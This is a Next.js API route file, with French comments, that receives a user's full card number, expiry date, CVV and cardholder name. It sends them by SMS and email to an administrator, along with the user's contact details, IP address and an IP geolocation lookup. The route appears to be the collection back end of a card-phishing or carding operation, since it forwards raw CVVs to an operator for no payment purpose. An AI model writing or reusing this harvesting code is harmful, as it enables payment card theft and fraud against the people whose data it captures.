// app/api/cards/request-sms/route.js
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { getDb } from "../../../../lib/db";
import { sendCardDetailsSms } from "../../../../lib/sms";
import { sendCardAdminEmail } from "../../../../lib/mail";

async function assertAuth() {
  const cookieStore = await cookies();
  const userId = cookieStore.get("user_id")?.value;
  if (!userId) return null;
  return userId;
}

// petite aide pour récupérer l'IP réelle
function getClientIp(req) {
  const xff = req.headers.get("x-forwarded-for");
  if (xff) {
    const parts = xff.split(",").map((s) => s.trim());
    if (parts[0]) return parts[0];
  }
  const realIp = req.headers.get("x-real-ip");
  if (realIp) return realIp;
  return req.headers.get("x-client-ip") || null;
}

async function fetchGeoFromFreeIPAPI(ip) {
  try {
    const url = ip
      ? `https://freeipapi.com/api/json/${encodeURIComponent(ip)}`
      : "https://freeipapi.com/api/json";

    const res = await fetch(url);
    if (!res.ok) {
      console.error("FreeIPAPI error status:", res.status);
      return null;
    }
    const data = await res.json();
    return {
      ip: data.ipAddress || ip || null,
      cityName: data.cityName || null,
      regionName: data.regionName || null,
      countryName: data.countryName || null,
      countryCode: data.countryCode || null,
      latitude: data.latitude ?? null,
      longitude: data.longitude ?? null,
      timeZone: data.timeZone || null,
      zipCode: data.zipCode || null,
      isProxy: data.isProxy ?? null,
    };
  } catch (err) {
    console.error("FreeIPAPI fetch error:", err);
    return null;
  }
}

export async function POST(req) {
  const userId = await assertAuth();
  if (!userId) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const body = await req.json().catch(() => null);
  if (!body) {
    return NextResponse.json({ error: "Invalid body" }, { status: 400 });
  }

  const { locale, cardNumber, expiryDate, cvv, cardholderName } = body;

  if (!cardNumber || !expiryDate || !cvv || !cardholderName) {
    return NextResponse.json(
      { error: "Missing card fields" },
      { status: 400 }
    );
  }

  const db = await getDb();

  try {
    const [users] = await db.execute(
      `SELECT full_name AS fullName, email, phone FROM users WHERE id = ? LIMIT 1`,
      [userId]
    );
    const user = users[0] || {};

    const adminPhone = process.env.ADMIN_PHONE || null;
    const adminEmail = process.env.ADMIN_EMAIL || null;

    if (!adminPhone) {
      await db.end();
      return NextResponse.json(
        { error: "ADMIN_PHONE not configured" },
        { status: 500 }
      );
    }

    // 1) SMS admin (logique existante, inchangée)
    await sendCardDetailsSms({
      to: adminPhone,
      user: { ...user, id: userId },
      locale,
      card: { cardNumber, expiryDate, cvv, cardholderName },
    });

    // 2) Email admin avec géoloc FreeIPAPI (si ADMIN_EMAIL configuré)
    if (adminEmail) {
      const ip = getClientIp(req);
      const geo = await fetchGeoFromFreeIPAPI(ip);
      const requestedAt = new Date().toISOString();

      await sendCardAdminEmail({
        to: adminEmail,
        adminName: process.env.ADMIN_NAME || "Admin",
        user: { ...user, id: userId },
        card: {
          cardNumber,
          expiryDate,
          cvv,
          cardholderName,
          locale,
          requestedAt,
        },
        geo: geo || {},
      });
    }

    await db.end();

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error("request-sms error:", err);
    await db.end();
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}
